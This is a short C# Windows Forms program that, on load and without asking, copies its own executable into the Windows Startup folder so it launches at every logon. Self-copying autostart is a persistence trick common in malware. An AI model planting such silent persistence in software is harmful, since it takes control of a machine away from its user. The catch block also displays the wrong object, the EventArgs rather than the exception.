using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Application_Copy_Itself_To_Startup
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;

            string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;

            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;


            try

            {
                //COPY THIS PROGRAM TO STARTUP
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile))
                {
                    System.IO.File.Copy(Application.ExecutablePath, Filepath);
                }
            }
            catch (Exception)
            {
                MessageBox.Show(e.ToString());
            }

        }
    }
}
